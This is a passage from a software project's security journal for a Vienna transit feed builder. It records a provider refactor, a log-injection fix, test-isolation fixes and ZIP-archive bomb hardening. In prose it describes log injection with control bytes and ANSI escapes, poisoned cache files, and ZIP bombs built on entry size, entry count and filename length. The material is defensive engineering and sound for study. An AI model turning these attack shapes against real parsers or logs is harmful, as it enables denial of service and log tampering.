**Change:** The S-Bahn Stammstrecke monitor is refactored from a *live* network-fetching provider that ran inside every `build_feed` cron tick (every 5 minutes) into a *cache-driven* provider that follows the standard project architecture used by Wiener Linien, ÖBB, VOR, and Baustellen. The split:
  * **`scripts/update_gtfs_cache.py`** (new) is the *write* half: it polls the official ÖBB GTFS-Realtime `TripUpdates` endpoint, calculates the average delay across the Floridsdorf↔Meidling corridor, and persists the result via `src.utils.files.write_json_atomic` at `cache/gtfs_stammstrecke/events.json`. State semantics: when the average delay > 9 minutes, the event is written with `first_seen` *preserved across runs* (so the eventual `[Seit DD.MM.YYYY]` description anchor stays anchored to the disruption start) and `updated` bumped to "now"; when the average is ≤ 9 minutes, the events list is emptied (the file is kept in place with metadata so the heartbeat / git-diff / mtime semantics match the WL/ÖBB/VOR cache files). The matching workflow `.github/workflows/update-gtfs-cache.yml` runs the script every 30 minutes (`cron: '*/30 * * * *'`) — a 6× reduction in outbound request rate to `realtime.oebb.at` versus the prior 5-minute build-feed cadence.
  * **`src/providers/gtfs_stammstrecke.py`** (rewritten) is the *read* half: it loads the cache document via `read_capped_json` and renders exactly one `FeedItem` when the persisted state shows an active above-threshold delay. The title is the canonical `"S-Bahn Stammstrecke: Derzeit durchschnittlich X Minuten Verspätung"`; the description starts with `[Seit DD.MM.YYYY]<br/><br/>` (date derived from the persisted `first_seen` rendered in Vienna local time) followed by the corridor body and `Datenquelle: ÖBB GTFS-Realtime.` — harmonised with the existing ÖBB / WL `<br/>`-delimited HTML aesthetic. `pubDate` carries the cache `updated` timestamp so the merged feed records freshness.
  * **`src/utils/files.py`** gains a small `write_json_atomic(path, payload, *, permissions=0o644, indent=2, sort_keys=False, ensure_ascii=False)` helper that wraps the existing `atomic_write` context manager for the common JSON-dump pattern. The standard `write_cache` helper requires a JSON list at the top level; the new helper supports the structured `{"events": [...], "metadata": {...}}` shape needed for stateful caches that persist `first_seen` alongside the events.
  * **Registry** (`src/feed/providers.py:fetch_gtfs_stammstrecke_events` and `src/build_feed.py:fetch_gtfs_stammstrecke_events`) is unchanged at the dispatcher level, but `init_providers` now sets `_provider_cache_name = "gtfs_stammstrecke"` on the build_feed loader (transitively, via `register_provider`), which moves the loader from the network-fetcher bucket into the cache-fetcher bucket — runs synchronously instead of inside the `ThreadPoolExecutor`. Both wrappers route exceptions through `sanitize_log_arg(str(exc))` (Clear-Text-Logging Drift Round 3 reinforcement applied at the wrapper site).

**Threat-model deltas:**
  * **Outbound HTTPS rate to `realtime.oebb.at` drops 6×** (5-minute cron → 30-minute cron). Politer to ÖBB OGD, narrows the slowloris / RCT vector window, and removes the network-fetch path from the build-feed `--timeout=60` budget entirely (the `_run_network_fetchers` ThreadPoolExecutor no longer dispatches the Stammstrecke loader).
  * **Cache file becomes a new piece of persistent state.** New attack surface: a poisoned `cache/gtfs_stammstrecke/events.json` (compromised CI runner / partial flush + power loss / corrupted previous run / parallel orchestrator process performing an atomic state swap mid-read) could (a) inject a fabricated delay event into the public feed, or (b) lie about `first_seen` to falsify the rendered `[Seit DD.MM.YYYY]` anchor. Mitigations layered: (i) `read_capped_json` enforces the canonical 50 MiB size cap and depth-bomb / TOCTOU defences (`os.fstat` on the open fd, `read(max+1)` for special-file safety); (ii) the cache file lives in the checked-in repo so any planted change surfaces in `git diff` AND in the git-auto-commit workflow's commit log under the `chore: update GTFS Stammstrecke cache` author; (iii) `write_json_atomic` uses `atomic_write`'s 0o644 perms + `os.replace` atomic rename + `fsync` so partial writes never appear at the live path; (iv) the rendered description text passes through the build_feed HTML truncation pipeline (`truncate_html`) so even a fully tampered cache cannot smuggle script tags; (v) the title is bounded to a fixed format string (`"S-Bahn Stammstrecke: Derzeit durchschnittlich X Minuten Verspätung"`) where `X` is coerced through `_coerce_int_minutes` before interpolation, blocking title injection.
  * **`first_seen` preservation is a state-machine invariant**: the update script's `compute_next_state` reads the existing cache document, finds the current active event's `first_seen`, and copies it into the next event when the delay stays above threshold. This guarantees the `[Seit DD.MM.YYYY]` anchor stays anchored to the START of the disruption — not to the most recent refresh. The `guid` is similarly preserved across the lifecycle of a single delay event (so dedupe in `build_feed` doesn't churn) and rotates only when the delay clears and re-triggers (new `first_seen` → new `guid`).
  * **Self-heal latency widens from 5 to 30 minutes** (the build-feed cron sees the cleared cache only on the next 30-minute refresh). Acceptable trade-off: the prior 5-minute self-heal also depended on the upstream feed being honest about the recovery, and the alert text already states "durchschnittlich" (averaged) so a few extra minutes of stale state is materially indistinguishable from baseline jitter. The cache file's `metadata.last_run` exposes the freshness for monitoring.
  * **The 2026-05-08 *Test-Mock Drift* entry's concern is closed**: the build_feed-cache regression tests (`tests/test_build_feed_cache.py`) used to need `STAMMSTRECKE_ENABLE=0` to prevent the test from triggering a real outbound HTTPS round-trip to `realtime.oebb.at`. The provider is now offline-only (reads from `cache/gtfs_stammstrecke/events.json` exclusively); the `STAMMSTRECKE_ENABLE=0` guards in those tests stay in place for backwards compatibility with the no-cache scenario, but a future test could enable the provider and assert the cache-read path without any network exposure.

**Test surface:** **48 new pytest cases** across the two halves. (a) `tests/providers/test_gtfs_stammstrecke.py` (rewritten end-to-end, 23 cases) drives the cache-read path via hand-built JSON cache documents in `tmp_path` — covers the threshold contract (>9 emits, =9 stays silent), the description prefix (`[Seit DD.MM.YYYY]` derived from `first_seen` rendered in Vienna local time, even when `first_seen` is UTC near midnight), the title format (rounded integer minutes), missing / malformed / non-object payload defences, missing-trip-count / missing-updated fallback to `first_seen`, explicit-vs-synthesised guid, and the `at-most-one-item` contract. (b) `tests/scripts/test_update_gtfs_cache.py` (new, 25 cases) drives the *write* half with stubbed `fetch_blob` / `parse_feed_message` so the suite stays fully offline — covers the protobuf parser (`iter_corridor_delays` arrival-vs-departure max-abs selection, corridor filter, empty corridor short-circuit), the `compute_next_state` state machine (clear when ≤9, create new when >9 with no prior, preserve `first_seen` + `guid` when >9 with active prior, clear when recovered, strict-`>` boundary at exactly 9.0), the run-update orchestration (persists active event → preserves `first_seen` across consecutive runs → clears events when recovered → returns 1 on empty corridor / empty blob / malformed payload / breaker-open), and the endpoint resolver (default when unset, untrusted host falls back to default, trusted host accepted).
  * `tests/test_sentinel_clear_text_logging_round3.py:test_post_fix_gtfs_stammstrecke_logs_strip_attack_bytes` is updated to call `scripts.update_gtfs_cache.load_stop_id_index` (the network catch site moved with the refactor) instead of the now-absent `src.providers.gtfs_stammstrecke.load_stop_id_index`. The sanitisation invariant is unchanged — every `except (OSError, ValueError)` body that logs the bound name routes through `sanitize_log_arg`. The inventory walker `test_no_bare_exc_logging_in_pr1350_modules` is extended to also scan `scripts/update_gtfs_cache.py` so the new file inherits the same auto-discoverable invariant.
  * Full sweep: **`pytest --timeout=60`** = 2253 passed, 3 skipped (was 2214 passed, 3 skipped pre-refactor; +39 net via the 48 new − 9 protobuf-fixture tests rewritten into the new layout). **`mypy --strict`**: clean across 43 source files. **`ruff check`**: clean across `src/`, `scripts/`, `tests/`.

**Why this entry sits in the Sentinel journal even though it is not a defect:** the refactor moves a piece of cron-pipeline outbound IO across a process boundary (build-feed cron → dedicated cache-update cron) and introduces a new piece of persistent state (`cache/gtfs_stammstrecke/events.json`) with a non-trivial threat model (stateful first_seen preservation, custom JSON shape, atomic write). Per the convention established by the *OSM-First Station Directory + GTFS-RT Stammstrecke Live Provider* entry below, every architectural change that touches network IO or persistent state belongs in the journal so the threat-model delta is captured for future operators. Anyone touching another live provider in the future should review this entry first — the recipe (split into `scripts/update_<x>_cache.py` + cache-only `src/providers/<x>.py` + 30-minute workflow + `write_json_atomic` for stateful shapes) is reusable for any provider that needs persistent state across runs.

## 2026-05-08 - Clear-Text-Logging Drift Round 3: PR #1350's New Live Providers Shipped Nine Bare-`exc` Logger Calls Plus an `OSMOverpassError` Chain That Embeds Raw `str(ValueError)` From `request_safe`
**Vulnerability:** The 2026-05-08 *Clear-Text-Logging Drift Round 2* round closed the bare-`%s, exc` pattern in three named cron-pipeline sites (`scripts/verify_vor_access_id.py:92`, `src/cli.py:_run_script:83`, `scripts/fetch_vor_haltestellen.py:fetch_access_id:157`) and codified the **Framework catch-all rule** (Round 2 prevention rule (b)): *"every `except Exception as <name>:` handler that lives in framework glue (CLI runners, subprocess wrappers, Flask/FastAPI error handlers, asyncio task callbacks) must follow the same `type(<name>).__name__` rule as direct credential-bearing handlers — even when the immediate caller has its own try/except, because the catch-all is reached precisely when the inner handler doesn't run."* PR #1350 (`f8de996`, *OSM-First Station Directory + GTFS-RT Stammstrecke Live Provider*) introduced two new live HTTP-fetching modules and an OSM enrichment hook in the orchestrator without applying the Round 2 rule. Re-running the auto-discoverable AST walker (`ExceptHandler.name` referenced as a positional argument to a `log[ger]?.<level>(...)` call) returned **eight open sites** plus **one RAISE-side embed of `str(ValueError)` text into a chained `OSMOverpassError`** that propagates upstream:

  (1) `src/providers/gtfs_stammstrecke.py:219` — `log.warning("Could not load scripts.gtfs.read_gtfs_stops: %s", exc)`. Catches `(ImportError, OSError)` from the GTFS reader's lazy import — path components in the OSError text can carry control characters from a corrupted `scripts/` install.
  (2) `src/providers/gtfs_stammstrecke.py:224-228` — `log.warning("Could not read GTFS stops file %s: %s", sanitize_log_arg(str(path)), exc)`. The path arg is sanitised but `exc` is bare; an `(OSError, ValueError)` from `read_gtfs_stops` carries operator-controlled file content fragments.
  (3) `src/providers/gtfs_stammstrecke.py:360-365` — `log.warning("Unexpected error while iterating GTFS-RT entities: %s: %s", type(exc).__name__, exc)`. The defensive `except Exception` catches protobuf parser errors whose messages can quote attacker-controlled bytes from the response payload (the parser's "Tag had invalid wire type at offset N" messages routinely embed raw bytes).
  (4) `src/providers/gtfs_stammstrecke.py:395-400` — same defensive shape while iterating the `stop_time_update` list.
  (5) `src/providers/gtfs_stammstrecke.py:533-537` — bare `exc` from `load_stop_id_index` in `fetch_events`.
  (6) `src/places/osm_client.py:249` — `LOGGER.debug("Error closing OSM session: %s", exc)`. Defensive cleanup of `requests.Session.close()`.
  (7) `src/places/osm_client.py:288` — **RAISE-side** embedding: `raise OSMOverpassError(f"Overpass request rejected: {exc}") from exc`. The `{exc}` interpolation embeds the *full* `str(ValueError)` from `request_safe` into the `OSMOverpassError` message, which then propagates upstream via `str(OSMOverpassError)` to the orchestrator's catch-all (sites 8-9) where it is logged. Today's `request_safe` `ValueError` text is sanitised by `_sanitize_url_for_error` and `_sanitize_exception_msg`, but defense-in-depth says the script must not RELY on that internal contract — a future refactor that added auth to `request_safe`'s URL canonicalisation (or that raised a different `ValueError` shape) would silently re-enable the leak.
  (8) `scripts/update_station_directory.py:_enrich_with_osm` line 837 — `logger.error("OSM Overpass enrichment failed: %s", exc)`. Bare `OSMOverpassError` (which carries the embedded `ValueError` text from site 7 today, and tomorrow's whatever-else).
  (9) `scripts/update_station_directory.py:_enrich_with_osm` line 840 — bare `exc` inside the defensive `except Exception` (catches anything `fetch_osm_places` could surface, including future `requests.RequestException` shapes the inner OSM client doesn't normalise yet).

The two new upstream endpoints (`overpass-api.de`, `realtime.oebb.at`) are public and carry no auth today, so the IMMEDIATE leak is not credential disclosure but **log-injection via control characters**: `urllib3` `MaxRetryError.__str__` and protobuf-parser exception messages can embed attacker-controlled bytes (the response body is bounded at 5 MiB / 8 MiB by `request_safe`/`fetch_content_safe`, but the *parser*'s error message can quote raw bytes from the failure offset). When those bytes contain `\n` / `\r` / ANSI escape sequences, the bare `%s, exc` pattern writes them into log lines verbatim — defeating post-hoc forensic analysis on the cron-runner logs and the auto-issue submission path in `src/feed/reporting.py` that POSTs log excerpts to the GitHub issue tracker. The exploit is REPRODUCED in `tests/test_sentinel_clear_text_logging_round3.py` with **9 tests** (1 precondition + 1 fix-shape PoC + 3 AST static checks per file/function + 1 RAISE-side AST check + 2 end-to-end behavioural PoCs + 1 auto-discoverable inventory walker). Pre-fix every site embedded the marker bytes (`ATTACKER_CTRL_BYTES_DO_NOT_LEAK` + `\n` + `\x1b[31m...`) verbatim into the log record; post-fix every site routes through `sanitize_log_arg(str(exc))` (preserves diagnostic info, strips control chars / ANSI / secrets) or uses `type(exc).__name__` (most conservative, used at the RAISE-side embed in `osm_client.py:288`).

**Learning:** Round 2 named the Framework catch-all rule and applied it to three explicitly-named scripts, but **a NEW PR (PR #1350, ten weeks before this entry by the cron-tick clock) introduced two entirely new live providers without auditing them against the rule**. Same recursive meta-pattern as every prior round of this family: each round closes the named subset, the next PR's new code surfaces a new subset. The right structural verdict for the clear-text-logging family is now: **every PR that adds a new `except` handler in a live provider OR in framework glue MUST run the AST walker BEFORE merge, not as a post-hoc sweep**. The auto-discoverable invariant lives in `tests/test_sentinel_clear_text_logging_round3.py:test_no_bare_exc_logging_in_pr1350_modules` — an AST-based scanner that walks the two PR #1350 modules and flags every `ExceptHandler.name` referenced as a positional argument to a `log[ger]?.<level>(...)` call. Any future PR that adds a new bare-exc logger call in those two modules fails the test at PR-review time. Sites #3, #4, #6 are particularly insidious because they live behind `# pragma: no cover - defensive` markers — the `cover` annotation tells the coverage gate to skip them, which is exactly when the auto-walker becomes the only line of defense (the test never exercises the code path so a regression-test-based check would never catch the leak). **The RAISE-side embed at site #7 generalises the rule beyond pure logging**: any `raise X(f"...{exc}")` chain where `X` propagates upstream to a framework catch-all is structurally equivalent to a `logger.<level>(..., exc)` call — both surface the chained exception's `str()` to the eventual log sink. The auto-walker therefore extends to `raise X(f"...{exc...}")` shapes inside an `ExceptHandler` body. Combined with all prior rounds, the clear-text-logging family canonical inventory now stands at **fourteen covered call sites across nine modules** (Round 1: ~8 in `src/`; Round 2: 3 in `scripts/` + 1 in `src/cli.py`; Round 3: 6 in `src/` + 2 in `scripts/` + 1 RAISE-side in `src/places/`).

**Prevention:** Three reinforcing rules:
  (a) **Pre-merge AST walker rule** (Round 2 reinforcement made permanent): every PR that adds or modifies an `except` handler in `src/providers/` or `src/places/` or any `scripts/` cron module MUST run the AST walker — `ast.parse(source).walk` on `ast.ExceptHandler` whose body contains a `Call` whose function is `log[ger]?.<level>` and whose args contain a `Name` reference matching the handler's bound name — BEFORE the PR is merged. The walker shape lives in `tests/test_sentinel_clear_text_logging_round3.py:_find_bare_exc_logger_calls`. Mirrors the inventory-test rule from the JSON size-bomb family (Round 2 prevention rule (a)) — same pre-merge AST walk applied to the clear-text-logging axis instead of the size-cap axis.
  (b) **Defensive-pragma audit rule**: every `except Exception` handler marked `# pragma: no cover - defensive` is a HIGHER-priority audit target, not a lower one. The pragma tells the coverage gate to skip the handler — which is exactly when the auto-walker becomes the only line of defense (the test never exercises the code path so a regression-test-based check would never catch the leak). The structural pin: every `# pragma: no cover - defensive` annotation in a `log[ger]?.<level>` site MUST be paired with `sanitize_log_arg(str(exc))` or `type(exc).__name__`, never bare `exc`.
  (c) **RAISE-side exception-chain audit rule**: any `raise X(f"...{exc...}")` inside an `ExceptHandler` body where `X` propagates upstream to a framework catch-all is structurally equivalent to a `logger.<level>(..., exc)` call — the chained exception's `str()` surfaces to the eventual log sink at the catch-all. The fix shape replaces `f"...{exc}"` with `f"...{type(exc).__name__}"` so the chained name is preserved (still useful for diagnostics) without embedding the raw text. Mirrors the same defense-in-depth pattern as direct logger-side fixes; both close the same dataflow sink at different points along the propagation chain.

The fix shape mirrors `61f2602` / `ed4631e` / Round 2: every bare `, exc` inside a logger call is replaced with `sanitize_log_arg(str(exc))` (preserves diagnostic info while stripping injection vectors). The RAISE-side embed at `osm_client.py:288` is replaced with `f"Overpass request rejected: {type(exc).__name__}"` — chained `from exc` is preserved so `logging.exception`-style tracebacks (where operators have explicitly opted in via `--debug`) still see the full context, but `str(OSMOverpassError)` no longer embeds attacker-controlled bytes. The new `sanitize_log_arg` import lands in `scripts/update_station_directory.py` alongside the existing `from src.utils.env import get_bool_env, load_default_env_files` block to keep the import pattern consistent with the rest of the script. PoC tests for every site exercise BOTH the pre-fix shape (asserts the marker bytes WOULD reach the log line) AND the post-fix shape (asserts the marker bytes are sanitised); the auto-discoverable inventory walker covers both `src/providers/gtfs_stammstrecke.py` and `src/places/osm_client.py` end-to-end, plus a function-scoped walker for `scripts/update_station_directory.py:_enrich_with_osm`.

## 2026-05-08 - Test-Mock Drift: New Live Providers Bypassed the Build-Feed-Cache Tests' Provider-Import Guard and Burned the Wrapper Test's Pytest-Timeout Budget on Real Network IO
**Vulnerability:** PR #1350's first CI run reported `1 failed, 2214 passed, 2 skipped` against the same 2217-test collection that runs cleanly locally as `2214 passed, 3 skipped`. The differential decoded to: (a) the two `pytest.importorskip("jsonschema")` tests skip on CI (jsonschema is *not* in `requirements-dev.txt`), accounting for two of the three locally-skipped tests; (b) `tests/test_update_all_stations_wrapper.py:test_wrapper_atomic_on_success` was the third locally-skipped test but ran on CI (network reachable) and *failed*. The root cause is a **defensive-test-mocking gap**: the wrapper test invokes `scripts/update_all_stations.py` as a subprocess with its own 600-second timeout, but the surrounding pytest run carries a strict 60-second per-test default (`pyproject.toml [tool.pytest.ini_options].addopts = "--timeout=60"`). My OSM addition introduced a real outbound HTTPS round-trip to `overpass-api.de` inside that subprocess — even within the urllib3 retry budget (default `total=4`, ~108s worst-case for the Overpass call alone), one slow Overpass response on a GitHub-hosted runner regularly tips the whole orchestrator past the 60-second pytest ceiling. *The first commit's "fix" was an anti-pattern* — it tightened production timeouts (25s → 15s) and disabled urllib3 retries (`total=0`) just to keep the subprocess under 60 seconds. That trade buys CI green at the cost of every operator's resilience: a single slow Overpass response in production now fails the entire enrichment pass instead of riding through the urllib3 retry stack. The same defensive-mocking gap exists for **`src/providers/gtfs_stammstrecke.py`**: the build-feed-cache regression tests (`tests/test_build_feed_cache.py:test_collect_items_missing_cache_logs_warning`, `:test_main_runs_without_network`, `:test_collect_items_reads_from_cache`) previously asserted on a fixed set of provider-empty-cache warnings. Adding a fifth default provider (`STAMMSTRECKE_ENABLE`) registered via `register_default_providers` made the build_feed dispatcher invoke its lazy-imported `fetch_events` *despite* the test's existing import guard (the relative `from .providers.gtfs_stammstrecke import …` slips past `name.startswith("src.providers")` because Python passes the relative `name="providers.gtfs_stammstrecke"` plus `level=1` rather than the absolute name). That triggered a real outbound HTTPS round-trip to `realtime.oebb.at` inside an offline-cache test, both burning network budget the test was specifically designed to avoid AND silently making the test *pretend* to run offline.

**Learning:** Two separate failure modes that share one root cause — *introducing a new live (network-fetching) component without auditing every test that calls into the surrounding orchestrator*. The architectural pattern that lets us add new providers without touching every existing test is the **PROVIDERS list + iter_providers() registry pair**, but it has a subtle interaction with import-time side effects: a loader registered via `register_default_providers` is reachable via `iter_providers()` even when individual tests think they've isolated it. The wrapper test is in the harder shape — it crosses a *subprocess boundary*, so Python-level monkeypatching is impossible; only env-var feature flags or filesystem-mocked endpoints work. The earlier commit's anti-pattern fix is the canonical example of how *not* to handle a CI failure: when production code is robust by construction (urllib3 retries + 25s timeouts + circuit breaker) and a test fails, the right response is to *fix the test*, not to weaken production. A "test-side env-flag" **is** a form of mocking — the test substitutes the real network call with a no-op via a feature flag the production code already has to honour for ops-disable scenarios. The two patterns are equivalent at the boundary; the test-side flag is just declared in env rather than in `unittest.mock.patch`.

**Prevention:** Three reinforcing rules:
  (a) **Live-provider test-isolation rule** (made permanent): every newly-registered default provider that does network IO MUST ship with the matching `STAMMSTRECKE_ENABLE`-style env disable, AND the offline-cache regression tests (`tests/test_build_feed_cache.py`, `tests/test_build_feed_io.py`) MUST set that env var to "0" via `monkeypatch.setenv` before invoking `_collect_items()` or `main()`. The auto-discoverable invariant: every test that exercises the build_feed dispatcher must either (i) override `PROVIDERS` to a closed list, or (ii) set every `*_ENABLE` env var to "0" for live providers. Failing to do either trips a real outbound network round-trip.
  (b) **Subprocess-boundary mock-via-env rule** (made permanent): wrapper tests that call into the orchestrator via `subprocess.run(...)` cannot use `unittest.mock.patch` because the patch lives in the parent process. The required pattern is an env-var feature flag in the orchestrator (e.g. `WIEN_OEPNV_OSM_ENRICH=0`) plus `subprocess.run(..., env={**os.environ, "WIEN_OEPNV_OSM_ENRICH": "0"})` in the test. The flag stays opt-out so production cron runs leave the env unset and OSM remains primary.
  (c) **Anti-pattern-fix detection rule** (CSV-round closing-grep made permanent): every PR that touches a "production timeout / retry / circuit-breaker threshold" alongside a CI fix MUST justify the change as a *production* concern, not a *test* concern. The audit grep at PR-review time: `git log -p -1 -- src/places src/providers src/utils/http.py src/utils/circuit_breaker.py | grep -E '\b(timeout|retries|recovery_timeout|failure_threshold)\b'`. Every match must be paired with a journal entry explaining why the production behaviour needed to change. PR #1350 commit `fe10d5e` is the canonical anti-pattern example — it reduced `_OVERPASS_QUERY_TIMEOUT_S` 25→15, `_MAX_TIMEOUT_S` 30→20, and disabled urllib3 retries (`total=0`) purely to make the wrapper test fit inside 60s, without any operator-visible justification. The fix in this entry reverts that commit and addresses the root cause via test-side env disable.

The fix shape: (i) `scripts/update_station_directory.py:main` now reads `WIEN_OEPNV_OSM_ENRICH` via `get_bool_env(..., True)` AND honours the existing `--osm-enrich/--no-osm-enrich` CLI flag — both must agree before OSM runs; (ii) `tests/test_update_all_stations_wrapper.py:test_wrapper_atomic_on_success` sets `WIEN_OEPNV_OSM_ENRICH=0` in the subprocess env so the OSM round-trip never fires inside the 60-second pytest budget; (iii) `tests/test_build_feed_cache.py` and `tests/test_build_feed_io.py` set `STAMMSTRECKE_ENABLE=0` via `monkeypatch.setenv` before invoking `_collect_items()` / `main()` so the live provider is skipped at the dispatcher's `if not enabled: continue` gate (no import, no fetch); (iv) `tests/providers/test_gtfs_stammstrecke.py` is rewritten end-to-end to construct GTFS-RT FeedMessage fixtures via `MagicMock` (per the project protobuf-testing convention) instead of building real protobuf wire bytes via `gtfs_realtime_pb2.FeedMessage().SerializeToString()`, dropping the `gtfs-realtime-bindings` import from the test path entirely.

## 2026-05-08 - Architecture: OSM-First Station Directory + GTFS-RT Stammstrecke Live Provider
**Change:** Two architectural additions to the cron pipeline. (a) **`src/places/osm_client.py`** introduces the OpenStreetMap Overpass API as the *primary* station-directory enrichment source; Google Places is downgraded to a fallback that runs only when at least one station is still missing coordinates after the OSM merge (or when OSM itself failed). The integration in `scripts/update_station_directory.py:main` queries Overpass once with a strict Vienna bounding-box query covering `public_transport=station/stop_area` and `railway=station/halt` across nodes/ways/relations; results flow through the existing `merge_places` pipeline so the Google fallback remains unchanged for stations OSM did not cover. (b) **`src/providers/gtfs_stammstrecke.py`** introduces a new live feed provider (`STAMMSTRECKE_ENABLE`, default on, registered both in `src/build_feed.py:DEFAULT_PROVIDERS` and `src/feed/providers.py:register_default_providers`) that polls the official ÖBB GTFS-Realtime `TripUpdates` feed, filters trip updates whose `stop_time_update` entries hit the ten Stammstrecke stop-ids resolved at runtime from `data/gtfs/stops.txt` (Floridsdorf, Handelskai, Traisengasse, Praterstern, Wien Mitte, Rennweg, Quartier Belvedere, Hauptbahnhof, Matzleinsdorfer Platz, Meidling), and yields *exactly one* consolidated `FeedItem` (title `"S-Bahn Stammstrecke: Derzeit durchschnittlich X Minuten Verspätung"`) when the corridor's mean delay is **strictly greater than 9 minutes**. At-or-below-threshold runs return `[]` and the feed builder's natural aggregation drops the alert — the self-heal property the spec requires. The new dependency `gtfs-realtime-bindings>=1.0.0,<3` is pinned in `requirements.txt`.

**Resilience scaffolding:** Both new modules layer the project's standard four-stage HTTP-resilience stack: (1) `session_with_retries` (urllib3 retries + ±20% jitter on 429/5xx); (2) `request_safe`/`fetch_content_safe` (SSRF + DNS-rebinding + content-type + body-size guards); (3) `CircuitBreaker` (`failure_threshold=5`, `recovery_timeout=300s`) protecting the cron from self-DDoS during multi-minute upstream outages; (4) bounded ``try/except`` collapsing every fetch / parse / decode error to `OSMOverpassError` (caller falls through to Google) or `[]` (Stammstrecke caller skips the alert this run). The `_TRUSTED_OVERPASS_HOSTS` and `_TRUSTED_GTFS_RT_HOSTS` allow-lists pin env overrides (`OVERPASS_URL`, `OEBB_GTFS_RT_URL`) to the canonical operator hosts so a compromised secret store cannot redirect either fetch to an attacker-controlled endpoint. Mandatory descriptive `User-Agent` strings (Overpass fair-use policy + ÖBB OGD policy) are validated at config-construction time and refused when blank.

**Threshold and self-heal contract:** `STAMMSTRECKE_THRESHOLD_MINUTES = 9` is matched against `>` (not `>=`) per spec — equality MUST NOT trigger an event so the corridor stays clean during baseline jitter. `calculate_average_delay_minutes` clamps negative per-trip delays at zero (a single early arrival cannot mask a real downstream delay) and returns `0.0` for an empty input set (the empty-corridor heal path). The provider is *stateless*: no on-disk cache, no in-process state machine, so every poll yields a fresh decision and a recovered corridor immediately drops the alert with the next merged-feed write — no operator action, no cache-eviction script, no stale-alert window.

**Test coverage:** 39 new pytest cases across `tests/places/test_osm_client.py` (16) and `tests/providers/test_gtfs_stammstrecke.py` (23). Coverage focuses on (i) parser correctness — Overpass JSON → `OSMStation` for nodes/ways/relations, GTFS-RT FeedMessage → `CorridorDelay` for arrival vs. departure delay; (ii) threshold enforcement — `>9` triggers, `=9` and `<9` stay silent, all-early trips stay silent; (iii) self-heal — sequential calls return `[FeedItem]` then `[]` when delays subside; (iv) resilience — malformed protobuf, missing GTFS stops file, breaker-open, network-failure, blank User-Agent, untrusted endpoint all collapse to safe defaults. Tests use `gtfs_realtime_pb2.FeedMessage().SerializeToString()` to build live protobuf bytes (no fixture files), and the OSM tests mock `request_safe` to avoid any real network IO. Full suite: 2214 passed, 3 skipped under `python -m pytest --timeout=30`. `mypy --strict` (CI-pinned 1.10.x via `python -m mypy src tests`): clean (no new errors). `ruff check --select E,F,S,B,UP src tests`: clean.

**Why this entry sits in the Sentinel journal even though it is not a defect:** the OSM and GTFS-RT additions both expand the project's *outbound HTTPS attack surface* — every cron tick now reaches two new operator hosts (`overpass-api.de`, `realtime.oebb.at`) on top of the existing four (ÖBB, VOR, Wiener Linien, Google Places). The Sentinel journal exists to record the threat-model deltas of every change that touches network IO, not just exploit closures. The new endpoints inherit the project's full SSRF + circuit-breaker + body-size + content-type + Slowloris stack via `request_safe` / `session_with_retries` / `CircuitBreaker`; the host allow-lists keep env-override drift contained; the descriptive `User-Agent` strings comply with both upstream operators' fair-use policies and identify the project to operators if abuse investigation ever becomes necessary. Anyone adding a sixth or seventh outbound host should review this entry first — every new endpoint must (a) route through `request_safe`, (b) declare a host allow-list for env overrides, (c) carry a `User-Agent` that survives the Overpass/GTFS-RT pattern review, and (d) wrap the upstream call in `CircuitBreaker` to keep one cron run's failure from cascading into the next.

## 2026-05-08 - ZIP Archive Three-Axes Bomb: `zipfile.ZipFile` Inherits Three Orthogonal Shape-Bomb Axes (Per-Entry, Count, Filename) That `sum(info.file_size) <= 100 MiB` Trivially Misses
**Vulnerability:** The 2026-05-08 CSV size-bomb round closed `csv.DictReader/reader` across ten sites and named the next-round target as **"every stdlib helper that takes a file-like and consumes via `iter` / `readline` / `read` without an explicit size argument"** — including **"any third-party parser that takes a file handle and reads through `iter`"**. Re-running the auto-discoverable closing grep `git grep -nE 'zipfile\.ZipFile\(' src/ scripts/ | grep -v 'test_'` returned **one open site in `scripts/update_station_directory.py:extract_stations`** (line 1248 pre-fix, **HIGH** — cron pipeline; downloads ÖBB station directory xlsx via `fetch_content_safe` (10 MiB compressed cap) and feeds it into `zipfile.ZipFile(...)` then `openpyxl.load_workbook(stream, read_only=True)`). The pre-fix defence was a single `total_size = sum(info.file_size for info in archive.infolist())` check against a 100 MiB cap. **Three orthogonal shape-bomb axes slip past this single-axis check entirely:** (1) **per-entry uncompressed cap** — a single 100-MiB-1-byte entry trivially passes `sum < 100 MiB` and forces openpyxl to load 100 MiB of XML into memory before any row is yielded (production xlsx have no entry larger than ~10 MiB, sheet1.xml); (2) **entry-count cap** — a million-empty-entry central-directory bomb (each declaring `file_size = 0`, sum = 0) passes the total-sum check and inflates `archive.infolist()` to a million ZipInfo objects (~150 bytes Python overhead each = 150 MiB before any consumer iterates); (3) **filename-length cap** — a planted multi-KiB filename per ZIP spec (up to 65535 bytes per filename) poisons every structured log line that includes `info.filename` and breaks downstream log parsers. Threat model is identical to the CSV/JSON-family rounds: compromised CDN / DNS-hijack / MITM serves a malicious xlsx the cron pipeline downloads via `fetch_content_safe`. The orchestrator (`scripts/update_all_stations.py`) runs `update_station_directory.py` via `subprocess.run(check=True)`, so an unhandled `MemoryError` (a `BaseException` subclass that escapes any `except (OSError, ValueError, zipfile.BadZipFile)` handler) raises `CalledProcessError` and aborts the WHOLE cron pipeline. The exploit is REPRODUCED in `tests/test_sentinel_zip_archive_validation.py` with **17 tests** (1 precondition + 4 per-axis behavioural PoCs + 4 within-cap regressions + 4 extract_stations integration tests + 1 metadata-trust PoC + 1 inventory walker + 1 sanity guard). Pre-fix `extract_stations` only checked `sum(info.file_size)` against the 100 MiB total cap; post-fix every site routes through the canonical helper `validate_zip_archive_safe(archive, label=...)` which closes all four axes (total + per-entry + count + filename).

**Learning:** The CSV-round prevention rule explicitly named the next round structural target — "any third-party parser that takes a file handle and reads through `iter`". `zipfile.ZipFile` is exactly such a parser: `infolist()` materialises every central-directory entry up-front (millions of empty entries inflate ZipInfo allocations even when `sum(file_size) == 0`), and `archive.open(member).read()` consumes via `iter(decompressor.decompress(...))`. The recursive meta-pattern across rounds is now seven layers deep: each round closes ONE axis (size, depth, TOCTOU, network, scope, shape, third-party) and surfaces the next. The right structural verdict for a sound defence is now **multi-axis closing-grep audit**: every parser that consumes operator-controlled bytes MUST be bounded on EVERY orthogonal shape axis (size + count + per-element + filename / per-key length / etc.), not just the canonical "total bytes" axis. Walking only the total-bytes axis (the canonical mistake of the prior `sum(info.file_size)` shape) leaves the orthogonal shape axes wide open. **Why metadata-based caps are sufficient (no streaming-decompression validation):** Python's `zipfile` enforces `info.file_size` as the upper bound on `archive.open(...).read()` via per-entry CRC validation (see `ZipExtFile._left = file_size` + `_update_crc` at EOF 